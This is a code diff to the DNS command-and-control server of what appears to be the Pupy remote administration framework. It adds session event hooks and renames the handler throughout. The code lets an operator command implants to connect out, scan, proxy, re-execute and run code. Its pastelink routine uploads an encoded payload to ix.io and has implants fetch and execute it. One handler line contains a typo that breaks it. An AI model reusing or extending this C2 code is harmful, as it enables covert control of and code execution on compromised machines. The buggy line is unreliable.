@@ -18,7 +18,13 @@ from urlparse import urlparse
 from os import path
 
 from .PupyTriggers import event
-from .PupyTriggers import ON_DNSCNC_SESSION, ON_DNSCNC_SESSION_LOST
+from .PupyTriggers import (
+    ON_DNSCNC_SESSION, ON_DNSCNC_SESSION_LOST,
+    ON_DNSCNC_EGRESS_PORTS, ON_DNSCNC_HIGH_RESOURCE_USAGE,
+    ON_DNSCNC_PSTORE, ON_DNSCNC_USER_ACTIVE,
+    ON_DNSCNC_USER_INACTIVE, ON_DNSCNC_USERS_INCREMENT,
+    ON_DNSCNC_USERS_DECREMENT, ON_DNSCNC_ONLINE_STATUS
+)
 
 class PupyDnsCommandServerHandler(DnsCommandServerHandler):
     def __init__(self, *args, **kwargs):
@@ -59,19 +65,53 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
         return nodeid in set([x.strip().lower() for x in allowed_nodes.split(',')])
 
     def on_new_session(self, session):
-        if self.server.cmdhandler:
-            event(
-                ON_DNSCNC_SESSION, session,
-                self.server,
-                self.server.cmdhandler, self.config,
-                sid=session.spi, node=session.node)
+        event(
+            ON_DNSCNC_SESSION, session,
+            self.server,
+            sid=session.spi, node=session.node)
 
     def on_session_cleaned_up(self, session):
-        if self.server.cmdhandler:
-            event(ON_DNSCNC_SESSION_LOST,
-                  session, self.server,
-                  self.server.cmdhandler, self.config,
-                  sid=session.spi, node=session.node)
+        event(ON_DNSCNC_SESSION_LOST,
+              session, self.server,
+              sid=session.spi, node=session.node)
+
+    def on_online_status(self, session):
+        event(ON_DNSCNC_ONLINE_STATUS, session,
+              self.server, sid=session.spi, node=session.node,
+              **session.online_status)
+
+    def on_egress_ports(self, session):
+        event(ON_DNSCNC_EGRESS_PORTS, session,
+              self.server, sid=session.spi, node=session.node,
+              ports=session.egress_ports)
+
+    def on_pstore(self, session):
+        event(ON_DNSCNC_PSTORE, session,
+              self.server, sid=session.spi, node=session.node)
+
+    def on_user_become_active(self, session):
+        event(ON_DNSCNC_USER_ACTIVE, session,
+              self.server, sid=session.spi, node=session.node)
+
+    def on_user_become_inactive(self, session):
+        event(ON_DNSCNC_USER_INACTIVE, session,
+              self.server, sid=session.spi, node=session.node)
+
+    def on_users_increment(self, session):
+        event(ON_DNSCNC_USERS_INCREMENT, session,
+              self.server, sid=session.spi, node=session.node,
+              count=session.system_status.users)
+
+    def on_users_decrement(self, session):
+        event(ON_DNSCNC_USERS_DECREMENT, session,
+              self.server, sid=session.spi, node=session.node,
+              count=session.system_status.users)
+
+    def on_high_resource_usage(self, session):
+        event(ON_DNSCNC_HIGH_RESOURCE_USAGE, session,
+              self.server, sid=session.spi, node=session.node,
+              mem=session.system_stsatus['mem'],
+              cpu=session.system_status['cpu'])
 
     def onlinestatus(self, node=None, default=False):
         return self.add_command(
@@ -228,7 +268,7 @@ class PupyDnsCnc(object):
         self.credentials = credentials
         self.igd = igd
         self.listeners = listeners
-        self.cmdhandler = cmdhandler
+        self.handler = cmdhandler
         self.pproxy = pproxy
 
         fdqn = self.config.get('pupyd', 'dnscnc').split(':')
@@ -248,7 +288,7 @@ class PupyDnsCnc(object):
         self.dns_port = port
         self.dns_listen = listen
         self.dns_recursor = recursor
-        self.handler = PupyDnsCommandServerHandler(
+        self.dns_handler = PupyDnsCommandServerHandler(
             domain, (
                 credentials['DNSCNC_PRIV_KEY'],
                 credentials['DNSCNC_PRIV_KEY_V2']
@@ -260,12 +300,12 @@ class PupyDnsCnc(object):
 
         if self.pproxy:
             try:
-                self.server = self.pproxy.dns(self.handler, domain)
+                self.server = self.pproxy.dns(self.dns_handler, domain)
             except Exception, e:
                 logging.exception(e)
         else:
             self.server = DnsCommandServer(
-                self.handler,
+                self.dns_handler,
                 address=listen,
                 port=int(port)
             )
@@ -280,11 +320,11 @@ class PupyDnsCnc(object):
         self.server.stop()
 
     def list(self, node=None):
-        return self.handler.find_sessions(node=node) \
-          or self.handler.find_sessions(spi=node)
+        return self.dns_handler.find_sessions(node=node) \
+          or self.dns_handler.find_sessions(spi=node)
 
     def nodes(self, node):
-        return self.handler.find_nodes(node)
+        return self.dns_handler.find_nodes(node)
 
     def connect(self, host=None, port=None, transport=None, node=None, default=False):
         if port:
@@ -342,38 +382,38 @@ class PupyDnsCnc(object):
                 self.cmdhandler.display_success('Connect: Transport: {} Host: {} Port: {}'.format(
                     transport, host, port))
 
-        return self.handler.connect(
+        return self.dns_handler.connect(
             [host], port, transport,
             node=node,
             default=default
         )
 
     def scan(self, *args, **kwargs):
-        return self.handler.scan(*args, **kwargs)
+        return self.dns_handler.scan(*args, **kwargs)
 
     def onlinestatus(self, **kwargs):
-        return self.handler.onlinestatus(**kwargs)
+        return self.dns_handler.onlinestatus(**kwargs)
 
     def disconnect(self, **kwargs):
-        return self.handler.disconnect(**kwargs)
+        return self.dns_handler.disconnect(**kwargs)
 
     def exit(self, **kwargs):
-        return self.handler.exit(**kwargs)
+        return self.dns_handler.exit(**kwargs)
 
     def sleep(self, *args, **kwargs):
-        return self.handler.sleep(*args, **kwargs)
+        return self.dns_handler.sleep(*args, **kwargs)
 
     def reexec(self, **kwargs):
-        return self.handler.reexec(**kwargs)
+        return self.dns_handler.reexec(**kwargs)
 
     def reset(self, **kwargs):
-        return self.handler.reset_commands(**kwargs)
+        return self.dns_handler.reset_commands(**kwargs)
 
     def dexec(self, *args, **kwargs):
-        return self.handler.dexec(*args, **kwargs)
+        return self.dns_handler.dexec(*args, **kwargs)
 
     def proxy(self, *args, **kwargs):
-        return self.handler.proxy(*args, **kwargs)
+        return self.dns_handler.proxy(*args, **kwargs)
 
     def pastelink(self, content=None, output=None, url=None,
                   action='pyexec', node=None, default=False, legacy=False):
@@ -392,8 +432,9 @@ class PupyDnsCnc(object):
             payload = b''
             # TODO: add more providers
             with open(content_path) as content:
-                payload = self.handler.encode_pastelink_content(
-                    content.read(), self.handler.ENCODER_V1 if legacy else self.handler.ENCODER_V2)
+                payload = self.dns_handler.encode_pastelink_content(
+                    content.read(), self.dns_handler.ENCODER_V1 \
+                    if legacy else self.dns_handler.ENCODER_V2)
 
             if not output:
                 response = requests.post('http://ix.io', data={'f:1':payload})
@@ -414,37 +455,37 @@ class PupyDnsCnc(object):
 
         count = 0
         if not output:
-            count = self.handler.pastelink(url, action, node=node, default=default)
+            count = self.dns_handler.pastelink(url, action, node=node, default=default)
 
         return count, url
 
     @property
     def policy(self):
         return {
-            'interval': self.handler.interval,
-            'timeout': self.handler.timeout,
-            'kex': self.handler.kex,
+            'interval': self.dns_handler.interval,
+            'timeout': self.dns_handler.timeout,
+            'kex': self.dns_handler.kex,
         }
 
     def set_policy(self, *args, **kwargs):
-        return self.handler.set_policy(*args, **kwargs)
+        return self.dns_handler.set_policy(*args, **kwargs)
 
     @property
     def dirty(self):
         count = 0
-        for session in self.handler.find_sessions():
+        for session in self.dns_handler.find_sessions():
             if session.commands:
                 count += 1
         return count
 
     @property
     def count(self):
-        return len(self.handler.sessions)
+        return len(self.dns_handler.sessions)
 
     @property
     def commands(self):
-        return self.handler.commands
+        return self.dns_handler.commands
 
     @property
     def node_commands(self):
-        return self.handler.node_commands
+        return self.dns_handler.node_commands
